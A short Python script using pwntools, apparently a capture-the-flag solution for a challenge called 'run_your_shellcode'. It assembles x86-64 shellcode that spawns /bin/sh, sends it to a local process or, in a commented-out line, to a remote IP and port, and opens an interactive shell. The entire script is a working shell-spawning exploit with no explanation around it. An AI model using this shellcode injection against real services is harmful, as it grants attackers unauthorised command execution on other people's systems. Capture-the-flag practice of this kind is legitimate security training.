from pwn import *

context.os = 'linux'
context.arch = 'amd64'

r = process('./run_your_shellcode')
#r = remote('34.64.219.95', 19505)

flag = b''

CODE = asm(shellcraft.sh())

r.sendline(CODE)

r.interactive()